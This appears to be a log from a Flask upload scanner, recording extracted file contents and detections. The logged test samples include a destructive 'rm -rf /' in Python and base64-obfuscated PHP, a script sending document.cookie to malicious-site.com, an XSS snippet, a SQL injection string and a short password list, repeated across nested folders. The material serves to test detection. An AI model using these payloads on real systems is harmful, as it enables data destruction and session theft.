2025-02-22 20:53:49,276 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:53:49,277 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:53:49,278 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:53:49,284 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:53:49,284 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:53:49,284 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:53:49,285 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:53:49,285 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml
2025-02-22 20:53:49,285 - Moved text_hidden_yaml.yaml to trash due to suspicious content.
2025-02-22 20:53:49,286 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:53:49,288 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:53:49,288 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/3.py
2025-02-22 20:53:49,288 - Moved 3.py to trash due to suspicious content.
2025-02-22 20:53:49,289 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:53:49,289 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/4.php
2025-02-22 20:53:49,289 - Moved 4.php to trash due to suspicious content.
2025-02-22 20:53:49,290 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:53:49,291 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:53:49,293 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:53:49,294 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:53:49,295 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:53:49,303 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx: Malicious Presentation
This presentation contains hidden malicious content.
Normal Slide
This is a normal slide with safe content.
Suspicious Content
exec('malicious_code_here')
2025-02-22 20:53:49,303 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_malicious.pptx
2025-02-22 20:53:49,303 - Moved test_malicious.pptx to trash due to suspicious content.
2025-02-22 20:53:49,305 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:53:49,305 - Malicious pattern detected in uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml
2025-02-22 20:53:49,305 - Moved text_hidden_yaml.yaml to trash due to suspicious content.
2025-02-22 20:53:49,306 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:53:49,309 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:53:49,309 - Malicious pattern detected in uploads/test/test/3.py
2025-02-22 20:53:49,309 - Moved 3.py to trash due to suspicious content.
2025-02-22 20:53:49,311 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:53:49,311 - Malicious pattern detected in uploads/test/test/4.php
2025-02-22 20:53:49,311 - Moved 4.php to trash due to suspicious content.
2025-02-22 20:53:49,313 - Extracted content from uploads/test/test/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:53:49,314 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 20:53:49,314 - Moved 1.sql to trash due to suspicious content.
2025-02-22 20:53:49,315 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:53:49,316 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:53:49,318 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:53:49,319 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:53:49,321 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:53:49,322 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:53:49,323 - Malicious pattern detected in uploads/new_test/new_test/text_hidden_yaml.yaml
2025-02-22 20:53:49,323 - Moved text_hidden_yaml.yaml to trash due to suspicious content.
2025-02-22 20:53:49,324 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:54:06,338 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:54:06,341 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:54:06,342 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:54:06,343 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:54:06,344 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:54:06,345 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:54:06,346 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:54:06,347 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:54:06,349 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:54:06,350 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:54:06,351 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:54:06,353 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:54:06,354 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:54:06,355 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:54:06,356 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:54:06,357 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:54:06,358 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:54:06,360 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:54:06,362 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:54:06,363 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:54:06,364 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:54:06,365 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:54:06,366 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:54:06,368 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:54:06,369 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:54:06,370 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:54:06,371 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:54:06,372 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:54:06,374 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:54:06,375 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:54:06,376 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:54:06,377 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:54:06,378 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:54:06,379 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:54:06,380 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:54:06,382 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:54:06,383 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:54:06,384 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:54:06,385 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:54:06,386 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:54:06,387 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:54:06,388 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:54:06,389 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:54:06,391 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:54:06,392 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:54:06,393 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:54:06,394 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:54:06,395 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:54:06,396 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:54:06,398 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:54:06,399 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:54:06,401 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:54:06,402 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:54:06,403 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:54:06,405 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:54:06,406 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:54:06,408 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:54:06,410 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:54:06,411 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:54:06,412 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:54:06,414 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:54:06,415 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:54:06,416 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:54:06,417 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:54:06,418 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:54:06,419 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:54:06,422 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:54:06,423 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:54:06,424 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:54:06,425 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
